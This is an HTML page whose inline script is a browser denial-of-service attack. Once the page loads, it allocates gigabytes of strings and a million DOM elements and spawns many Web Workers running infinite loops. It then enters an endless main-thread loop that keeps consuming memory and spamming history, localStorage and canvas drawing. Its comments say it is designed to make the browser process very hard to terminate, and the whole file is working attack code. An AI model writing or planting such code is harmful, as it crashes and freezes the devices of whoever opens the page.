<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM CRITICAL - MAX LOAD</title>
    <meta charset="UTF-8">
    <style>
        body { margin: 0; overflow: hidden; background-color: #000; color: #f00; font-family: monospace; text-align: center; }
        h1 { text-shadow: 0 0 10px #f00; animation: blink 1s infinite alternate; }
        p { color: #ff0; }
        canvas { display: block; margin: 10px auto; border: 1px solid #f00; }
        @keyframes blink { from { opacity: 1; } to { opacity: 0.5; } }
    </style>
</head>
<body>

    <h1>!!! MAXIMUM OVERLOAD INITIATED !!!</h1>
    <p>Attempting complete system resource saturation and process lock...</p>
    <canvas id="chaosCanvas" width="300" height="150"></canvas>

    <script>
    // ==========================================================================
    // WARNING: EXTREMELY DANGEROUS SCRIPT
    // This script is designed to cause an immediate, severe freeze and make the
    // browser process incredibly difficult to terminate. It will consume vast
    // amounts of CPU, RAM, and other resources.
    // USE ONLY IN ISOLATED VIRTUALIZED ENVIRONMENTS FOR TESTING PURPOSES.
    // You WILL need to force-quit the browser process via Task Manager/Activity Monitor.
    // ==========================================================================

    console.log("!!! INITIATING ULTIMATE FREEZE SEQUENCE !!!");

    // --- Configuration ---
    const INITIAL_MEMORY_STRINGS = 15 * 1000 * 1000; // Aim for ~15 million strings (~15GB+)
    const INITIAL_DOM_ELEMENTS = 1 * 1000 * 1000;   // 1 million DOM elements
    const NUM_WORKERS_TO_SPAWN = navigator.hardwareConcurrency ? navigator.hardwareConcurrency * 4 : 16; // Spawn many workers (e.g., 4x cores or 16)

    // --- Phase 1: Massive Initial Resource Allocation ---

    let initialMemoryHog = [];
    console.log(`Phase 1a: Allocating initial memory (${INITIAL_MEMORY_STRINGS} strings)...`);
    try {
        for (let i = 0; i < INITIAL_MEMORY_STRINGS; i++) {
            // Create ~1KB strings
            initialMemoryHog.push(new Array(1000).join('X') + Math.random());
            // Add occasional console log without overwhelming it (might not show before freeze)
            // if (i % 1000000 === 0) console.log(`Allocated ${i / 1000000}M strings...`);
        }
        console.log("Phase 1a: Initial memory allocation attempt complete.");
    } catch (e) {
        console.error("Phase 1a: Error during initial memory allocation (likely hit limit):", e);
        initialMemoryHog = null; // Release reference if failed massively
    }

    console.log(`Phase 1b: Creating ${INITIAL_DOM_ELEMENTS} DOM elements...`);
    const body = document.body;
    try {
        const fragment = document.createDocumentFragment(); // More efficient appending
        for (let i = 0; i < INITIAL_DOM_ELEMENTS; i++) {
            const div = document.createElement('div');
            // Minimal styling to add some weight without complex layout cost during creation
            div.style.cssText = 'position:absolute;width:1px;height:1px;background:#' + ((1<<24)*Math.random()|0).toString(16).padStart(6,'0');
            div.style.left = `${Math.random() * 100}vw`;
            div.style.top = `${Math.random() * 100}vh`;
            fragment.appendChild(div);
        }
        body.appendChild(fragment);
        console.log("Phase 1b: DOM element creation attempt complete.");
    } catch (e) {
        console.error("Phase 1b: Error during DOM creation:", e);
    }

    // --- Phase 2: Saturate CPU Cores with Web Workers ---

    console.log(`Phase 2: Spawning ${NUM_WORKERS_TO_SPAWN} Web Workers for CPU saturation...`);
    const workerCode = `
        // Worker script: Infinite loop to consume CPU
        let counter = 0;
        while (true) {
            counter++;
            if (counter > 1e9) counter = 0; // Prevent potential overflow issues, though unlikely to matter
            // Optionally add a tiny bit of math work
            // Math.sqrt(Math.random());
        }
    `;
    const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(workerBlob);
    let workers = [];
    for (let i = 0; i < NUM_WORKERS_TO_SPAWN; i++) {
        try {
            const worker = new Worker(workerUrl);
            workers.push(worker);
            // Optional: Add error handling for worker creation itself
            // worker.onerror = (err) => console.error(`Worker ${i} error:`, err);
        } catch (e) {
            console.error(`Failed to create worker ${i}:`, e);
        }
    }
    console.log(`Phase 2: ${workers.length} workers launched.`);
    // Note: We don't revokeObjectURL as workers need it.

    // --- Phase 3: Main Thread Infinite Loop with Continuous Stress ---

    console.log("Phase 3: Entering main thread infinite loop with continuous resource drain...");
    let continuousMemory = [];
    let historyCounter = 0;
    let storageCounter = 0;
    const canvas = document.getElementById('chaosCanvas');
    const ctx = canvas.getContext('2d', { alpha: false }); // Use opaque canvas for potential perf gain
    const largeStringForStorage = new Array(1024 * 10).join('S'); // ~10KB string for storage spam

    while (true) {
        // 3a: Continuous Memory Allocation
        try {
            // Allocate smaller strings constantly inside the loop
            continuousMemory.push(new Array(500).join('C') + Math.random());
            // Optional: Limit array size to prevent it becoming the *sole* bottleneck too quickly
            // if (continuousMemory.length > 5000000) continuousMemory.shift(); // Keep ~5M recent items
        } catch (e) { /* Ignore allocation errors, keep looping */ }

        // 3b: Continuous History API Spam
        try {
            // Use replaceState to avoid massive history list, focus on API stress
            history.replaceState(null, '', `/#${historyCounter++}-${Math.random().toString(36).substring(2)}`);
        } catch (e) { /* Ignore history errors */ }

        // 3c: Continuous localStorage Spam
        try {
            // Write ~10KB repeatedly to different keys
            localStorage.setItem(`spam_${storageCounter++ % 500}`, largeStringForStorage + storageCounter);
        } catch (e) { /* Ignore storage errors (like quota exceeded) */ }

        // 3d: Continuous Canvas Drawing Stress
        try {
            const width = canvas.width;
            const height = canvas.height;
            // Draw random noise or complex patterns
            for (let i = 0; i < 50; i++) { // Draw multiple shapes per frame
                 ctx.fillStyle = `rgb(${Math.random()*255|0},${Math.random()*255|0},${Math.random()*255|0})`;
                 ctx.fillRect(Math.random() * width, Math.random() * height, Math.random() * 20, Math.random() * 20);
            }
            // Maybe add image data manipulation for extra CPU/memory stress
            // let imageData = ctx.getImageData(0, 0, width, height);
            // for (let i = 0; i < imageData.data.length; i += 4) { imageData.data[i] = 255 - imageData.data[i]; } // Invert colors
            // ctx.putImageData(imageData, 0, 0);
        } catch(e) { /* Ignore canvas errors */ }

        // The loop itself consumes the main CPU thread. Operations inside add continuous pressure.
    }

    // This part is unreachable
    console.log("!!! SEQUENCE COMPLETED (IMPOSSIBLE) !!!");

    </script>

</body>
</html>
